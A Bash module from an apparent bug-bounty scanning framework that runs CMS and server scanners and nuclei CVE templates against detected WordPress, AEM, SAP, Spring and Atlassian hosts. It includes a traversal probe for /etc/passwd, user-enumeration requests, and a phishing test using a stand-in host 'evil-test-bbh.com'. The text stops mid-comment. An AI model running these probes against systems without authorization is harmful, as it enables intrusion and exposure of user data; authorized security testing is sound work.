#!/usr/bin/env bash
# ============================================================
#  modules/25_cms_scan.sh
#  Fase 25: Scanners específicos por tecnología detectada
#
#  Activación automática según tech fingerprinting (módulo 10):
#    WordPress   → wpscan
#    Joomla      → joomscan
#    Drupal      → droopescan
#    Magento     → magescan
#    AEM         → aem-hacker + nuclei AEM
#    Liferay     → nuclei Liferay + JSONWS enum
#    SAP NW      → icmscanner + nuclei SAP
#    Jenkins     → nuclei jenkins
#    Confluence  → nuclei atlassian
#    Spring Boot → nuclei actuator
#    Log4j       → log4j-scan (CVE-2021-44228)
#    Spring4Shell→ nuclei Spring (CVE-2022-22965)
#    Apache      → nuclei apache + struts check
#
#  IMPORTANTE: Solo se activa si la tecnología fue detectada
#  por el módulo 10 — no genera ruido innecesario.
# ============================================================

MODULE_NAME="cms_scan"
MODULE_DESC="Scanners específicos por tecnología detectada"

# ── Instalar herramientas si no están ─────────────────────────
_ensure_wpscan() {
  command -v wpscan &>/dev/null && return 0
  log_info "Instalando wpscan..."
  gem install wpscan 2>/dev/null && return 0
  # Fallback: Docker
  command -v docker &>/dev/null && \
    docker pull wpscanteam/wpscan:latest 2>/dev/null && return 0
  log_warn "wpscan no disponible"
  return 1
}

_ensure_joomscan() {
  command -v joomscan &>/dev/null && return 0
  log_info "Instalando joomscan..."
  local DIR="$HOME/tools/joomscan"
  [[ ! -d "$DIR" ]] && \
    git clone -q https://github.com/OWASP/joomscan.git "$DIR" 2>/dev/null
  ln -sf "$DIR/joomscan.pl" /usr/local/bin/joomscan 2>/dev/null || true
  command -v joomscan &>/dev/null && return 0
  return 1
}

_ensure_droopescan() {
  command -v droopescan &>/dev/null && return 0
  pip3 install droopescan --break-system-packages -q 2>/dev/null && return 0
  return 1
}

_ensure_aem_hacker() {
  local DIR="$HOME/tools/aem-hacker"
  [[ -d "$DIR" ]] && return 0
  log_info "Instalando aem-hacker..."
  git clone -q https://github.com/0ang3el/aem-hacker.git "$DIR" 2>/dev/null
  pip3 install --break-system-packages -r "$DIR/requirements.txt" -q 2>/dev/null || true
  [[ -d "$DIR" ]] && return 0
  return 1
}

_ensure_log4j_scan() {
  command -v log4j-scan &>/dev/null && return 0
  local DIR="$HOME/tools/log4j-scan"
  [[ ! -d "$DIR" ]] && \
    git clone -q https://github.com/fullhunt/log4j-scan.git "$DIR" 2>/dev/null
  pip3 install --break-system-packages -r "$DIR/requirements.txt" -q 2>/dev/null || true
  [[ -f "$DIR/log4j-scan.py" ]] && \
    ln -sf "$DIR/log4j-scan.py" /usr/local/bin/log4j-scan 2>/dev/null || true
  return 0
}

# ── Helper: notificar finding ─────────────────────────────────
_cms_finding() {
  local DOMAIN_ID="$1" DOMAIN="$2" TARGET="$3"
  local TYPE="$4" SEVERITY="$5" DETAIL="$6" TEMPLATE="${7:-cms_scan}"
  local CONFIDENCE="${8:-unverified}"

  db_add_finding "$DOMAIN_ID" "cms_scan" "$SEVERITY" \
    "$TARGET" "$TEMPLATE" "$DETAIL" "$CONFIDENCE"

  local EMOJI="🔴"
  [[ "$SEVERITY" == "medium" ]] && EMOJI="🟠"
  [[ "$SEVERITY" == "low"    ]] && EMOJI="🟡"

  # Solo notificar Telegram si confidence>=high (Mejora B)
  if [[ "$CONFIDENCE" == "high" ]] || [[ "${TELEGRAM_ALL_FINDINGS:-0}" == "1" ]]; then
    _telegram_send "${EMOJI} *CMS Scan — ${TYPE}*
🌐 \`${DOMAIN}\`
🎯 \`${TARGET}\`
📋 ${DETAIL:0:300}
✅ Confidence: ${CONFIDENCE}
📅 $(date '+%Y-%m-%d %H:%M:%S')" 2>/dev/null || true
  fi

  log_warn "  ⚡ [$SEVERITY/$CONFIDENCE] $TYPE: $TARGET — $DETAIL"
}

# ── Obtener subdominios con una tecnología concreta ───────────
_get_subs_with_tech() {
  local DOMAIN_ID="$1"
  local TECH_PATTERN="$2"   # patrón LIKE para tech_name
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND tech_name LIKE '${TECH_PATTERN}';" 2>/dev/null
}

_get_urls_with_tech() {
  local DOMAIN_ID="$1"
  local TECH_PATTERN="$2"
  sqlite3 "$DB_PATH" \
    "SELECT DISTINCT url FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND tech_name LIKE '${TECH_PATTERN}';" 2>/dev/null
}

# ──────────────────────────────────────────────────────────────
#  SCANNERS POR TECNOLOGÍA
# ──────────────────────────────────────────────────────────────

# ── WordPress REST API passive scan (sin API token) ───────────
#
# Extrae plugins instalados desde los namespaces de /wp-json/,
# comprueba endpoints sensibles sin auth, y detecta el vector
# de phishing via Application Passwords.
_wp_rest_passive_scan() {
  local DOMAIN_ID="$1" DOMAIN="$2" URL="$3" CURL_PROXY="$4"

  local WP_JSON_URL="${URL%/}/wp-json/"
  local RESP STATUS BODY

  RESP=$(curl -si --max-time 10 \
    -H "User-Agent: Mozilla/5.0" \
    -H "Accept: application/json" \
    ${CURL_PROXY} "${WP_JSON_URL}" 2>/dev/null)
  STATUS=$(echo "$RESP" | head -1 | grep -o '[0-9][0-9][0-9]')
  BODY=$(echo "$RESP" | sed -n '/^\r\{0,1\}$/,$ p' | tail -n +2)

  [[ "$STATUS" != "200" ]] && return

  # 1. Extraer namespaces y mapear a plugins conocidos
  local NAMESPACES
  NAMESPACES=$(echo "$BODY" | python3 -c "
import sys, json
try:
    d = json.load(sys.stdin)
    for ns in d.get('namespaces', []):
        print(ns)
except: pass
" 2>/dev/null)
  [[ -z "$NAMESPACES" ]] && return

  declare -A _NS_MAP
  _NS_MAP=(
    ["yoast/v1"]="Yoast SEO"
    ["contact-form-7/v1"]="Contact Form 7"
    ["newsletter_api/v1"]="Newsletter"
    ["jetpack/v4"]="Jetpack"
    ["jetpack-boost/v1"]="Jetpack Boost"
    ["cron-control/v1"]="VIP Cron Control"
    ["two-factor/1.0"]="Two-Factor Auth"
    ["akismet/v1"]="Akismet"
    ["wpcom/v2"]="WordPress.com API"
    ["vip/v1"]="WordPress VIP"
    ["woocommerce/v1"]="WooCommerce"
    ["woocommerce/v2"]="WooCommerce"
    ["woocommerce/v3"]="WooCommerce"
    ["buddypress/v1"]="BuddyPress"
    ["learndash/v1"]="LearnDash LMS"
    ["elementor/v1"]="Elementor"
    ["gravityforms/v2"]="Gravity Forms"
    ["ninja-forms/v1"]="Ninja Forms"
    ["rankmath/v1"]="Rank Math SEO"
    ["mepr/v1"]="MemberPress"
    ["tribe/events/v1"]="The Events Calendar"
    ["wc/v3"]="WooCommerce"
    ["give-api/v2"]="GiveWP Donations"
    ["lifterlms/v1"]="LifterLMS"
  )

  local DETECTED=""
  while IFS= read -r NS; do
    [[ -z "$NS" ]] && continue
    local PNAME="${_NS_MAP[$NS]:-}"
    [[ -n "$PNAME" ]] && DETECTED+="${PNAME} [${NS}], "
  done <<< "$NAMESPACES"

  if [[ -n "$DETECTED" ]]; then
    DETECTED="${DETECTED%, }"
    log_info "  wp-json namespaces → $DETECTED"
    _cms_finding "$DOMAIN_ID" "$DOMAIN" "${WP_JSON_URL}" \
      "WordPress REST API Plugin Fingerprint" "info" \
      "Plugins via namespaces (sin API token): ${DETECTED}" "wp_rest_api"
  fi

  # 2. User enumeration via /wp/v2/users
  local USERS_URL="${URL%/}/wp-json/wp/v2/users"
  local U_STATUS U_BODY
  U_BODY=$(curl -s --max-time 8 -H "User-Agent: Mozilla/5.0" \
    ${CURL_PROXY} -o /tmp/.wp_users_$$ -w "%{http_code}" "$USERS_URL" 2>/dev/null)
  U_STATUS="$U_BODY"
  U_BODY=$(cat /tmp/.wp_users_$$ 2>/dev/null); rm -f /tmp/.wp_users_$$

  if [[ "$U_STATUS" == "200" ]]; then
    local USER_LIST
    USER_LIST=$(echo "$U_BODY" | python3 -c "
import sys, json
try:
    users = json.load(sys.stdin)
    if isinstance(users, list) and users:
        for u in users:
            print(f'id={u.get(\"id\",\"?\")} slug={u.get(\"slug\",\"?\")} name={u.get(\"name\",\"?\")}')
except: pass
" 2>/dev/null)
    if [[ -n "$USER_LIST" ]]; then
      _cms_finding "$DOMAIN_ID" "$DOMAIN" "$USERS_URL" \
        "WordPress User Enumeration" "medium" \
        "wp/v2/users accesible sin auth: ${USER_LIST//$'\n'/ | }" "wp_rest_api"
    fi
  fi

  # 3. Newsletter subscribers expuestos (plugin Newsletter)
  if echo "$NAMESPACES" | grep -q "newsletter_api"; then
    local NL_URL="${URL%/}/wp-json/newsletter_api/v1/users"
    local NL_STATUS
    NL_STATUS=$(curl -o /dev/null -s --max-time 8 -w "%{http_code}" \
      -H "User-Agent: Mozilla/5.0" ${CURL_PROXY} "$NL_URL" 2>/dev/null)
    if [[ "$NL_STATUS" == "200" ]]; then
      _cms_finding "$DOMAIN_ID" "$DOMAIN" "$NL_URL" \
        "WordPress Newsletter Subscribers Exposed" "high" \
        "newsletter_api/v1/users accesible sin auth — suscriptores expuestos (GDPR)" "wp_rest_api"
    fi
  fi

  # 4. Application Password phishing — success_url sin validación de origen
  local AP_URL="${URL%/}/wp-admin/authorize-application.php"
  local AP_LOC
  AP_LOC=$(curl -si --max-time 8 -H "User-Agent: Mozilla/5.0" \
    -G --data-urlencode "app_name=Test" \
        --data-urlencode "success_url=https://evil-test-bbh.com" \
    ${CURL_PROXY} "$AP_URL" 2>/dev/null | grep -i "^location:" | tr -d '\r')

  # Vulnerable si preserva success_url externo en el redirect al login
  if echo "$AP_LOC" | grep -qi "evil-test-bbh\.com\|success_url"; then
    _cms_finding "$DOMAIN_ID" "$DOMAIN" "$AP_URL" \
      "WordPress Application Password Phishing" "high" \
      "authorize-application.php preserva success_url externo sin validar — admin que aprueba envía su Application Password al atacante" "wp_rest_api"
  fi
}

# ── WordPress ─────────────────────────────────────────────────
_scan_wordpress() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"

  local SUBS
  SUBS=$(_get_subs_with_tech "$DOMAIN_ID" "%WordPress%")
  [[ -z "$SUBS" ]] && return

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check 2>/dev/null || true
  local CURL_PROXY=""
  ${PROXY_ACTIVE:-false} && CURL_PROXY="--proxy ${PROXY_URL}"

  # REST API passive scan — no requiere wpscan ni API token
  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    _wp_rest_passive_scan "$DOMAIN_ID" "$DOMAIN" "https://${SUB}" "$CURL_PROXY"
  done <<< "$SUBS"

  _ensure_wpscan || { log_warn "wpscan no disponible para WordPress"; return; }

  local WP_TOKEN="${WPSCAN_API_TOKEN:-}"

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local URL="https://${SUB}"
    log_info "  wpscan → $URL"
    local WP_OUT="$OUT_DIR/.wpscan_${SUB//[^a-zA-Z0-9]/_}.json"

    local TOKEN_FLAG=""
    [[ -n "$WP_TOKEN" ]] && TOKEN_FLAG="--api-token $WP_TOKEN"

    # Usar Docker si está disponible, sino wpscan directo
    if docker image inspect wpscanteam/wpscan:latest &>/dev/null 2>&1; then
      timeout 300 docker run --rm wpscanteam/wpscan \
        --url "$URL" \
        --format json \
        --no-banner \
        --plugins-detection passive \
        $TOKEN_FLAG \
        2>/dev/null > "$WP_OUT" || true
    else
      timeout 300 wpscan \
        --url "$URL" \
        --format json \
        --no-banner \
        --plugins-detection passive \
        $TOKEN_FLAG \
        2>/dev/null > "$WP_OUT" || true
    fi

    if [[ -s "$WP_OUT" ]] && command -v jq &>/dev/null; then
      # Vulnerabilidades en plugins
      local VULNS
      VULNS=$(jq -r '.plugins[]? |
        .vulnerabilities[]? |
        "\(.title) — \(.references.url[0] // "")"' \
        "$WP_OUT" 2>/dev/null | head -10)

      if [[ -n "$VULNS" ]]; then
        while IFS= read -r VULN; do
          [[ -z "$VULN" ]] && continue
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
            "WordPress Plugin Vuln" "high" "$VULN" "wpscan"
        done <<< "$VULNS"
      fi

      # Usuario admin por defecto
      local USERS
      USERS=$(jq -r '.users // {} | keys[]' "$WP_OUT" 2>/dev/null | tr '\n' ',')
      [[ -n "$USERS" ]] && \
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
          "WordPress Users Enumerated" "medium" "Usuarios: $USERS" "wpscan"

      # XML-RPC habilitado
      jq -r '.interesting_findings[]? | select(.type=="xmlrpc") | .url' \
        "$WP_OUT" 2>/dev/null | while read -r XMLRPC; do
        [[ -n "$XMLRPC" ]] && \
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$XMLRPC" \
            "WordPress XML-RPC enabled" "medium" \
            "XML-RPC habilitado — posible bruteforce y SSRF" "wpscan"
      done
    fi
    rm -f "$WP_OUT"
  done <<< "$SUBS"
}

# ── Joomla ────────────────────────────────────────────────────
_scan_joomla() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  SUBS=$(_get_subs_with_tech "$DOMAIN_ID" "%Joomla%")
  [[ -z "$SUBS" ]] && return

  _ensure_joomscan || { log_warn "joomscan no disponible"; return; }

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local URL="https://${SUB}"
    log_info "  joomscan → $URL"
    local JS_OUT="$OUT_DIR/.joomscan_${SUB//[^a-zA-Z0-9]/_}.txt"

    timeout 120 perl "$HOME/tools/joomscan/joomscan.pl" \
      -u "$URL" --ec 2>/dev/null > "$JS_OUT" || true

    if [[ -s "$JS_OUT" ]]; then
      local VULNS
      VULNS=$(grep -iP "vuln|exploit|CVE|critical|high" "$JS_OUT" | head -10)
      [[ -n "$VULNS" ]] && \
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
          "Joomla Vulnerability" "high" "$VULNS" "joomscan"

      # Admin expuesto
      grep -qi "administrator" "$JS_OUT" && \
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${URL}/administrator" \
          "Joomla Admin Panel" "medium" "Panel de administración accesible" "joomscan"
    fi
    rm -f "$JS_OUT"
  done <<< "$SUBS"
}

# ── Drupal ────────────────────────────────────────────────────
_scan_drupal() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  SUBS=$(_get_subs_with_tech "$DOMAIN_ID" "%Drupal%")
  [[ -z "$SUBS" ]] && return

  _ensure_droopescan || { log_warn "droopescan no disponible"; return; }

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local URL="https://${SUB}"
    log_info "  droopescan → $URL"
    local DS_OUT="$OUT_DIR/.droopescan_${SUB//[^a-zA-Z0-9]/_}.txt"

    timeout 120 droopescan scan drupal -u "$URL" 2>/dev/null > "$DS_OUT" || true

    if [[ -s "$DS_OUT" ]]; then
      local VERSION
      VERSION=$(grep -oP "Drupal \d+\.\d+[\.\d]*" "$DS_OUT" | head -1)
      [[ -n "$VERSION" ]] && \
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
          "Drupal Version Detected" "info" "$VERSION detectado" "droopescan"

      grep -qi "vulnerable\|CVE" "$DS_OUT" && \
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$URL" \
          "Drupal Vulnerability" "high" \
          "$(grep -i 'vulnerable\|CVE' "$DS_OUT" | head -3 | tr '\n' ' ')" "droopescan"
    fi
    rm -f "$DS_OUT"
  done <<< "$SUBS"
}

# ── AEM (Adobe Experience Manager) ───────────────────────────
_scan_aem() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  # AEM — solo si detectado en tech fingerprinting o en URLs crawleadas
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT t.subdomain FROM technologies t
     WHERE t.domain_id=${DOMAIN_ID}
       AND (t.tech_name LIKE '%AEM%' OR t.tech_name LIKE '%Adobe%'
            OR t.tech_name LIKE '%Experience Manager%')
     UNION
     SELECT DISTINCT s.subdomain FROM subdomains s
     WHERE s.domain_id=${DOMAIN_ID} AND s.status='alive'
       AND EXISTS (
         SELECT 1 FROM urls u
         WHERE u.domain_id=s.domain_id
           AND (u.url LIKE '%/crx/%' OR u.url LIKE '%/system/console%'
                OR u.url LIKE '%/bin/querybuilder%'
                OR u.url LIKE '%/libs/granite%'
                OR u.url LIKE '%/content/dam%')
       );" 2>/dev/null)
  if [[ -z "$SUBS" ]]; then
    log_info "  AEM: sin indicios de Adobe Experience Manager — saltando"
    return
  fi

  log_info "  Checking AEM endpoints..."
  local AEM_PATHS=(
    "/crx/de/index.jsp"
    "/system/console/bundles"
    "/system/console/configMgr"
    "/bin/querybuilder.json"
    "/content/../etc/passwd"
    "/etc/clientlibs"
    "/.json"
    "/content.infinity.json"
    "/crx/explorer/index.jsp"
    "/libs/granite/core/content/login.html"
  )

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    local IS_AEM=false

    # Skip catch-all hosts upfront (Bug #1: SPA shells fingen ser AEM)
    if is_catchall_host "$BASE" 2>/dev/null; then
      log_info "  Skip AEM scan: $BASE → catch-all host"
      continue
    fi

    # Detectar AEM por paths característicos + body validation
    # _noredirect: Bug #9 — un 30x con -L falsifica 200 sobre SPA catch-all/redirect
    # _validate_aem_exposed: Bug #1 — exigir marcadores reales de AEM en body
    for AEM_PATH in "/libs/granite/core/content/login.html" "/crx/de/index.jsp"; do
      _h_get_noredirect "${BASE}${AEM_PATH}" --connect-timeout 8
      local STATUS="$HTTP_LAST_STATUS"
      if [[ "$STATUS" == "200" || "$STATUS" == "302" ]] && _validate_aem_exposed; then
        IS_AEM=true
        log_warn "  ⚡ AEM detectado: $BASE"
        break
      fi
    done

    $IS_AEM || continue

    # Comprobar paths críticos (noredirect: Bug #9 + body shape: Bug #1)
    for AEM_PATH in "${AEM_PATHS[@]}"; do
      _h_get_noredirect "${BASE}${AEM_PATH}" --connect-timeout 8
      local STATUS="$HTTP_LAST_STATUS"

      # 200 + body con marcadores AEM (no solo SPA shell) → confidence=high
      if [[ "$STATUS" == "200" ]] && _validate_aem_exposed; then
        local SEVERITY="medium"
        [[ "$AEM_PATH" == *"crx/de"* || "$AEM_PATH" == *"console"* ]] && SEVERITY="critical"
        [[ "$AEM_PATH" == *"passwd"* ]] && SEVERITY="critical"

        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${AEM_PATH}" \
          "AEM Exposed Endpoint" "$SEVERITY" \
          "Endpoint AEM accesible: ${AEM_PATH} — body validado con marcadores AEM" \
          "aem_check" "high"
      fi
    done

    # aem-hacker si está disponible
    if _ensure_aem_hacker 2>/dev/null; then
      local AEM_OUT="$OUT_DIR/.aemhacker_${SUB//[^a-zA-Z0-9]/_}.txt"
      timeout 120 python3 "$HOME/tools/aem-hacker/aem_hacker.py" \
        -u "$BASE" --workers 5 2>/dev/null > "$AEM_OUT" || true
      [[ -s "$AEM_OUT" ]] && \
        grep -qi "found\|vulnerable\|exposed" "$AEM_OUT" && \
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
          "AEM aem-hacker findings" "high" \
          "$(grep -i 'found\|vulnerable' "$AEM_OUT" | head -3 | tr '\n' '|')" "aem-hacker"
      rm -f "$AEM_OUT"
    fi

    # Nuclei templates AEM
    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" -tags "aem,adobe" -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "AEM Nuclei" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi
  done <<< "$SUBS"
}

# ── Liferay ───────────────────────────────────────────────────
_scan_liferay() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  SUBS=$(_get_subs_with_tech "$DOMAIN_ID" "%Liferay%")
  [[ -z "$SUBS" ]] && return

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  Liferay scan → $BASE"

    # JSONWS API — enumerar métodos disponibles (noredirect: ver Bug #9)
    local JSONWS_STATUS
    JSONWS_STATUS=$(_h_status_noredirect "${BASE}/api/jsonws" --connect-timeout 8)

    if [[ "$JSONWS_STATUS" == "200" ]]; then
      _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}/api/jsonws" \
        "Liferay JSONWS API Exposed" "high" \
        "API JSONWS accesible — posible enumeración de métodos y SSRF" "liferay"
    fi

    # CVE-2020-7961 — Deserialización RCE (uno de los más famosos en H1)
    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" -tags "liferay,cve-2020-7961" -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "Liferay CVE" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi
  done <<< "$SUBS"
}

# ── SAP NetWeaver ──────────────────────────────────────────────
_scan_sap() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  SUBS=$(_get_subs_with_tech "$DOMAIN_ID" "%SAP%")
  [[ -z "$SUBS" ]] && return

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local SAP_PATHS=(
    "/sap/bc/gui/sap/its/webgui"
    "/sap/bc/soap/rfc"
    "/sap/opu/odata/"
    "/sap/bc/rest/"
    "/nwa"
    "/sap/bc/adt/"
    "/sap/hana/ide/"
    "/irj/portal"
    "/sap/bc/webdynpro/sap/"
  )

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  SAP NetWeaver scan → $BASE"

    # Comprobar endpoints SAP críticos (noredirect: ver Bug #9)
    for SAP_PATH in "${SAP_PATHS[@]}"; do
      local STATUS
      STATUS=$(_h_status_noredirect "${BASE}${SAP_PATH}" --connect-timeout 8)

      if [[ "$STATUS" == "200" || "$STATUS" == "401" || "$STATUS" == "403" ]]; then
        local SEVERITY="medium"
        [[ "$STATUS" == "200" ]] && SEVERITY="high"
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${SAP_PATH}" \
          "SAP NetWeaver Endpoint" "$SEVERITY" \
          "Endpoint SAP ${STATUS}: ${SAP_PATH}" "sap_check"
      fi
    done

    # Nuclei con templates SAP — incluye CVE-2020-6287 (RECON vuln)
    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" \
        -tags "sap,netweaver,cve-2020-6287,cve-2020-6286" \
        -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV HOST
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "SAP Nuclei" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi
  done <<< "$SUBS"
}

# ── Jenkins ───────────────────────────────────────────────────
_scan_jenkins() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  SUBS=$(_get_subs_with_tech "$DOMAIN_ID" "%Jenkins%")
  [[ -z "$SUBS" ]] && return

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  Jenkins scan → $BASE"

    # Nuclei templates Jenkins — CVE-2024-23897, CVE-2019-1003000, etc.
    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" \
        -tags "jenkins,rce,exposure" \
        -severity "medium,high,critical" \
        -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "Jenkins" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi
  done <<< "$SUBS"
}

# ── Atlassian (Confluence / Jira) ─────────────────────────────
_scan_atlassian() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%Confluence%' OR tech_name LIKE '%Jira%'
            OR tech_name LIKE '%Atlassian%');" 2>/dev/null)
  [[ -z "$SUBS" ]] && return

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  Atlassian scan → $BASE"

    # CVEs Atlassian son muy frecuentes en H1 — CVE-2022-26134, CVE-2021-26084
    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" \
        -tags "confluence,jira,atlassian,cve-2022-26134,cve-2021-26084" \
        -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "Atlassian" "$SEV" "Template: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi
  done <<< "$SUBS"
}

# ── Spring Boot actuator ──────────────────────────────────────
_scan_spring() {
  local DOMAIN_ID="$1" DOMAIN="$2" OUT_DIR="$3"
  local SUBS
  SUBS=$(sqlite3 "$DB_PATH" \
    "SELECT DISTINCT subdomain FROM technologies
     WHERE domain_id=${DOMAIN_ID}
       AND (tech_name LIKE '%Spring%' OR tech_name LIKE '%Java%');" 2>/dev/null)
  [[ -z "$SUBS" ]] && return

  source "${SCRIPT_DIR}/core/proxy.sh" 2>/dev/null || true
  proxy_check
  local CURL_PROXY=""
  $PROXY_ACTIVE && CURL_PROXY="--proxy ${PROXY_URL}"

  local ACTUATOR_PATHS=(
    "/actuator"
    "/actuator/env"
    "/actuator/heapdump"
    "/actuator/mappings"
    "/actuator/beans"
    "/actuator/configprops"
    "/actuator/logfile"
    "/actuator/httptrace"
    "/actuator/threaddump"
  )

  while IFS= read -r SUB; do
    [[ -z "$SUB" ]] && continue
    local BASE="https://${SUB}"
    log_info "  Spring Boot actuator → $BASE"

    # Skip catch-all (Bug #4: SPA devuelve 200 para todos los /actuator/*)
    if is_catchall_host "$BASE" 2>/dev/null; then
      log_info "  Skip Spring Actuator: $BASE → catch-all host"
      continue
    fi

    # Spring Actuator probes — noredirect (Bug #9) + body shape (Bug #4) → confidence=high
    for ACT_PATH in "${ACTUATOR_PATHS[@]}"; do
      _h_get_noredirect "${BASE}${ACT_PATH}" --connect-timeout 8
      local STATUS="$HTTP_LAST_STATUS"
      if [[ "$STATUS" == "200" ]] && _validate_actuator_response; then
        local SEVERITY="medium"
        [[ "$ACT_PATH" == *"heapdump"* || "$ACT_PATH" == *"env"* ]] && SEVERITY="high"
        _cms_finding "$DOMAIN_ID" "$DOMAIN" "${BASE}${ACT_PATH}" \
          "Spring Boot Actuator Exposed" "$SEVERITY" \
          "Actuator endpoint accesible: ${ACT_PATH} — JSON shape validada" \
          "spring_actuator" "high"
      fi
    done

    # Spring4Shell — CVE-2022-22965
    if command -v nuclei &>/dev/null; then
      nuclei -u "$BASE" \
        -tags "spring,cve-2022-22965,spring4shell" \
        -silent -jsonl 2>/dev/null | \
        while IFS= read -r LINE; do
          local TEMPLATE SEV
          TEMPLATE=$(echo "$LINE" | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('template-id','?'))" 2>/dev/null)
          SEV=$(echo "$LINE"      | python3 -c "import json,sys; d=json.loads(sys.stdin.read()); print(d.get('info',{}).get('severity','?'))" 2>/dev/null)
          _cms_finding "$DOMAIN_ID" "$DOMAIN" "$BASE" \
            "Spring4Shell" "$SEV" "CVE-2022-22965: $TEMPLATE" "nuclei:$TEMPLATE"
        done
    fi
  done <<< "$SUBS"
}

# ── Log4Shell (CVE-2021-44228) ────────────────────────────────
# Solo se lanza contra subdominios con tecnología Java/Log4j detectada.
# Indicadores: Java, Tomcat, Spring, Log4j, Struts, JBoss, WebLogic,
